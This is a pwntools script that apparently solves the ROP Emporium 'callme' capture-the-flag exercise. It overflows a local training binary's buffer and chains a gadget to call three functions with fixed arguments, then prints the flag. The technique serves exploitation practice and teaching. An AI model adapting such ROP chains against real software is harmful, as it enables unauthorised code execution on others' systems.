from pwn import *

BINARY = "./callme"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

p = process(BINARY)

pop_rdi_rsi_rdx_ret = 0x40093c
ret = 0x00000000004006be

rop = b"A" * 40
rop += p64(ret)
rop += p64(pop_rdi_rsi_rdx_ret)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xcafebabecafebabe)
rop += p64(0xd00df00dd00df00d)
rop += p64(ELF.symbols['callme_one'])

rop += p64(pop_rdi_rsi_rdx_ret)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xcafebabecafebabe)
rop += p64(0xd00df00dd00df00d)
rop += p64(ELF.symbols['callme_two'])

rop += p64(pop_rdi_rsi_rdx_ret)
rop += p64(0xdeadbeefdeadbeef)
rop += p64(0xcafebabecafebabe)
rop += p64(0xd00df00dd00df00d)
rop += p64(ELF.symbols['callme_three'])

log.success(f"ROP chain : {rop}")
p.recv()
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
